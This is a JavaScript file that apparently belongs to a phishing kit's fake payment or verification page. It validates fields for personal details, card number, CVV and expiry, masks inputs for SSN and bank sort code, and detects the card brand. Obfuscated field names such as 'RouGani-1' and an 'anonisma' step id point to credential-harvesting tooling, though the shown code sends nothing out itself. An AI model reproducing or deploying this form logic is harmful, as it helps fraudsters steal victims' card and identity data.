$(document).ready(function () {
        
        $('.ccinput').keyup(function() {
            if($(this).val() == 4){
                $('#ccbox').css('background-position', '0 -23px');
            }
            else if($(this).val() == 5){
                $('#ccbox').css('background-position', '0 -46px');
            }
            else if($(this).val() == 3){
                $('#ccbox').css('background-position', '0 -69px');
            }
            else if($(this).val() == 6){
                $('#ccbox').css('background-position', '0 -92px');
            }
            else if($(this).val() == ''){
                $('#ccbox').css('background-position', '0 0');
            }   
        });
        
    });
function checklogin2() {
    var fname = $('input[name=RouGani-1]').val();
    var dare = $('input[name=RouGani-2]').val();
    var phone = $('input[name=RouGani-3]').val();
    var City = $('input[name=RouGani-5]').val();
    var Zip = $('input[name=RouGani-6]').val();
    var Country = $('input[name=RouGani-7]').val();
    var aa = $('input[name=RouGani-8]').val();
    var aaa = $('input[name=RouGani-9]').val();
    var aaaa = $('input[name=RouGani-10]').val();

    if(fname == ''){ $('input[name=RouGani-1]').css("border", "1px solid #C72F38"); return false; }   
    if(dare == ''){ $('input[name=RouGani-2]').css("border", "1px solid #C72F38"); return false; }  
    if(phone == ''){ $('input[name=RouGani-3]').css("border", "1px solid #C72F38"); return false; }     
    if(City == ''){ $('input[name=RouGani-5]').css("border", "1px solid #C72F38"); return false; }   
    if(Zip == ''){ $('input[name=RouGani-6]').css("border", "1px solid #C72F38"); return false; }   
    if(Country == ''){ $('input[name=RouGani-7]').css("border", "1px solid #C72F38"); return false; }
    if(aa == ''){ $('input[name=RouGani-8]').css("border", "1px solid #C72F38"); return false; }
    if(aaa == ''){ $('input[name=RouGani-9]').css("border", "1px solid #C72F38"); return false; }
    if(aaaa == ''){ $('input[name=RouGani-10]').css("border", "1px solid #C72F38"); return false; }   
    return true;
}
function checklogin1() {
    var cn = $('input[name=RouGani-11]').val();
    var cvv = $('input[name=RouGani-12]').val();
    var exp = $('input[name=RouGani-13]').val();
    var name = $('input[name=RouGani-14]').val();

    if(cn == ''){ $('input[name=RouGani-11]').css("border", "1px solid #C72F38"); return false; }   
    if(cvv == ''){ $('input[name=RouGani-12]').css("border", "1px solid #C72F38"); return false; }  
    if(name == ''){ $('input[name=RouGani-14]').css("border", "1px solid #C72F38"); return false; }
    if(exp == ''){ $('input[name=RouGani-13]').css("border", "1px solid #C72F38"); return false; }   
    return true;
}
function checklogin() {
    var cn = $('input[name=RouGani-15]').val();
    var cvv = $('input[name=RouGani-16]').val();
    var exp = $('input[name=RouGani-17]').val();

    if(cn == ''){ $('input[name=RouGani-15]').css("border", "1px solid #C72F38"); return false; }   
    if(cvv == ''){ $('input[name=RouGani-16]').css("border", "1px solid #C72F38"); return false; }  
    if(exp == ''){ $('input[name=RouGani-17]').css("border", "1px solid #C72F38"); return false; }   
    return true;
}
        jQuery(function($){
            $("#date").mask("99/9999");
             $("#sortcode").mask("99-99-99");
             
            $("#ssn").mask("999-99-9999");
        });
        /*verif if null or true*/
        /*   $(document).ready(function(){
         var cardlong = document.getElementById('card_number);
         if(cardlong.length == false){
         alert('yes');
         }
         $('#card_number').blur(function() {
         $('#card_number').css('border','1px solid #cf1900');
         });

         });

         $('#date').blur(function() {
         $('#date').css('border','1px solid #cf1900');
         });
         $('#cvv').blur(function() {
         $('#cvv').css('border','1px solid #cf1900');
         });
         */
        /*start scrit check*/
        $(document).on("click","#inchecked",function(){
            var inchecked = document.getElementById('inchecked');
            var input_check = document.getElementById('checkbox');

            if(inchecked.id == 'inchecked'){
                inchecked.id = "checked";
                input_check.setAttribute('checked','checked');
            }
        });
        $(document).on("click","#checked",function(){
            var checked = document.getElementById('checked');
            var input_check = document.getElementById('checkbox');
            if(checked.id == 'checked'){
                checked.id = "inchecked";
                input_check.removeAttribute('checked');
            }
        });
        /*En of script*/


        function type_carte(){
            var get_value = document.getElementById('card_number').value;
            var type = get_value.substring(0,2);
            var other = get_value.substring(0,1);
            if(other == "4"){
                document.getElementById("card").style.backgroundPosition = "0px 1px";
                document.getElementById("cvv").maxLength ="3"
            }else if(other == "5"){
                document.getElementById("card").style.backgroundPosition = "0px -29px";
                document.getElementById("cvv").maxLength ="3"
            }
            /*Amex Card*/
            else if(type == "34"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }
            else if(type == "37"){
                document.getElementById("card").style.backgroundPosition = "0px -57px";
                document.getElementById('cont_in').style.display ="none"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -462px";
                document.getElementById("cvv").maxLength ="4"
            }

            /*End Amex Card*/

            /*blue Card*/
            else if(type == "30"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            } else if(type == "36"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "38"){
                document.getElementById("card").style.backgroundPosition = "0px -116px";
                document.getElementById('cont_in').style.display ="none"
            }
            /*End blue Card*/
            else if(other == "6"){
                document.getElementById("card").style.backgroundPosition = "0px -86px";
                document.getElementById('cont_in').style.display ="none"
            }
            else if(type == "35"){
                document.getElementById("card").style.backgroundPosition = "0px -145px";
                document.getElementById('cont_in').style.display ="none"
            }else{
                document.getElementById("card").style.backgroundPosition = "0px -406px";
                document.getElementById('cont_in').style.display ="block"
                document.getElementById('type_cvv').style.backgroundPosition ="0px -434px";
                document.getElementById("cvv").maxLength ="3"
            }
        };
    $(document).ready(function(){    
    $("#a-n-o-n-isma-s-t-e-p-s").keypress(function(e) { 
    if (e.which == 13) { 
    return false; 
    } 
    });   
    });              
    window.onload = function openVentana(){            
    $(".POP-RGN-2").slideDown(1000);             
    }       
    function closeVentana(){            
    $(".POP-RGN-2").slideUp("fast");          
   } 